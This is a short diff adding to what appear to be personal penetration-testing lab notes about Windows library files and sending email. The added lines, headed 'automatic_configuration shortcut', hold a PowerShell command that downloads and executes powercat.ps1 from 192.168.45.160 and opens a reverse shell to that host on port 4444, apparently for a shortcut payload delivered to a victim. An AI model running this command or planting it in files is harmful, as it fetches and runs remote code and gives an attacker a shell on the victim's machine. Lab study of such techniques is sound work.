@@ -957,6 +957,11 @@ folderType -> use Documents guid
 </libraryDescription>
 ```
 
+automatic_configuration shortcut
+```
+powershell.exe -c "IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.45.160:8000/powercat.ps1'); powercat -c 192.168.45.160 -p 4444 -e powershell"
+```
+
 easy way to send email
 
 
